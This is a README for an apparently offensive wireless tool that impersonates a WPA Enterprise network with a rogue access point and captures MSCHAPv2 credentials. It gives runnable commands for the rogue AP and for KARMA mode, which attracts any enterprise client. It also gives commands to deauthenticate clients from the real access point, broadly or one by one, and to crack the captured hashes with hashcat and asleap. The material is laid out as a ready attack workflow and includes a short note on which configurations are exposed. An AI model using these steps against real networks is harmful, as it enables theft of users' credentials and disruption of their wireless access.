# wpa-enterprise-attack

WPA Enterprise (802.1X/EAP) credential capture using
[hostapd-mana](https://github.com/sensepost/hostapd-mana) in WPE
(Wireless Pwnage Edition) mode.

Sets up a rogue AP that impersonates a WPA Enterprise network and intercepts
EAP authentication attempts. Captures MSCHAPv2 challenge/response pairs from
clients connecting via PEAP or EAP-TTLS, which can then be cracked offline.

## Prerequisites

- Root privileges
- A wireless adapter that supports AP mode
- The target network must use WPA Enterprise with PEAP or EAP-TTLS/MSCHAPv2
  (the most common enterprise deployment)
- Clients must connect to the rogue AP - deauth them from the real AP first
  using the `deauth/` flake

## Usage

```bash
sudo nix run --extra-experimental-features 'nix-command flakes' . -- <interface> <ssid> [output-dir]
```

| Argument | Required | Description |
|---|---|---|
| `interface` | yes | Wireless interface for the rogue AP |
| `ssid` | yes | SSID to impersonate (must exactly match the target network) |
| `output-dir` | no | Directory for credential logs (default: current dir) |

## Environment variables

| Variable | Default | Description |
|---|---|---|
| `EAP_CHANNEL` | `6` | AP channel |
| `EAP_BAND` | `2.4` | Frequency band: `2.4` or `5` |
| `EAP_KARMA` | `0` | Set to `1` to respond to all probe requests (KARMA mode) |
| `EAP_CRACK` | `0` | Set to `1` to auto-crack captured hashes when `WORDLIST` is set |
| `WORDLIST` | - | Wordlist for `hashcat -m 5500` |

## Examples

```bash
# Basic capture on channel 6
sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 CorpWiFi

# 5 GHz, channel 36, write to /tmp/eap
EAP_CHANNEL=36 EAP_BAND=5 \
  sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 CorpWiFi /tmp/eap

# KARMA mode: attract any enterprise client regardless of SSID
EAP_KARMA=1 \
  sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 CorpWiFi

# Auto-crack captured hashes with hashcat
EAP_CRACK=1 WORDLIST=/path/to/rockyou.txt \
  sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 CorpWiFi /tmp/eap
```

## How it works

1. A self-signed CA and server certificate are generated on-the-fly with openssl
2. hostapd-mana starts a rogue WPA Enterprise AP with that certificate
3. When a client connects and initiates EAP authentication:
   - The client opens a TLS tunnel to the rogue server (using the self-signed cert)
   - If the client does not validate the server certificate (the common misconfiguration),
     it proceeds with inner MSCHAPv2 authentication
   - hostapd-mana WPE captures the MSCHAPv2 challenge/response pair
4. Captured credentials are written to `eap-creds-<timestamp>.txt`
5. hashcat-ready hashes are extracted to `eap-hashes-<timestamp>.txt`

## Deauthenticating clients from the real AP

With the rogue AP running, clients will only connect if they lose their
association to the real AP. Use the `deauth/` flake in a second terminal
to force them to reconnect:

```bash
# Deauth all clients from the real AP (broadcast deauth)
sudo nix run --extra-experimental-features 'nix-command flakes' ../deauth -- <interface> <channel> <bssid>

# Deauth a specific client
sudo nix run --extra-experimental-features 'nix-command flakes' ../deauth -- <interface> <channel> <bssid> <client-mac>
```

Use the `beacon/` or `ap-clients/` flake first to identify the channel, BSSID,
and connected client MACs:

```bash
# Find the target AP and its clients
sudo nix run --extra-experimental-features 'nix-command flakes' ../ap-clients -- <interface>
```

Typical flow:

1. Start the rogue AP: `nix run . -- wlan0 CorpWiFi`
2. Note the channel and BSSID of the real AP from `ap-clients` output
3. Deauth clients: `nix run ../deauth -- wlan1 6 AA:BB:CC:DD:EE:FF`
4. Watch the rogue AP terminal for captured MSCHAPv2 credentials

Two adapters work best — one for the rogue AP, one for deauth — but a single
adapter can do both if you stop the rogue AP briefly, deauth, then restart.

## Cracking captured hashes

MSCHAPv2 hashes are written in NetNTLMv1 format (hashcat mode 5500):

```bash
# Crack with hashcat
hashcat -m 5500 eap-hashes-*.txt /path/to/wordlist.txt

# GPU-accelerated with rules
hashcat -m 5500 -r /path/to/best64.rule eap-hashes-*.txt wordlist.txt

# Crack with asleap (uses challenge/response directly)
asleap -C <challenge> -R <response> -W wordlist.txt
```

## KARMA mode

With `EAP_KARMA=1`, the rogue AP responds to probe requests for any SSID.
This is useful when you do not know which enterprise SSID clients are
configured to connect to, or want to capture credentials from roaming
enterprise clients without a targeted SSID.

## Dev shell

```bash
nix develop
```

Available: `hostapd-mana`, `asleap`, `hashcat`, `aircrack-ng`, `iw`, `openssl`.

## Notes

- The most common vulnerable configuration is PEAP with MSCHAPv2 inner auth
  where the client does not enforce server certificate validation. Windows,
  Android, and iOS all allow this misconfiguration through group policy or
  manual profile settings.
- EAP-TTLS with PAP sends credentials in plaintext inside the TLS tunnel —
  if a client uses this and connects to the rogue AP, credentials are captured
  as cleartext rather than as a hash.
- EAP-TLS (certificate-based) is not vulnerable to this attack.
- DH parameters are generated on-the-fly at 2048-bit (required by OpenSSL 3.x).
  Expect a few extra seconds at startup during generation.
- Combine with the `deauth/` flake to disconnect clients from the real AP and
  force them to reconnect to the rogue AP.
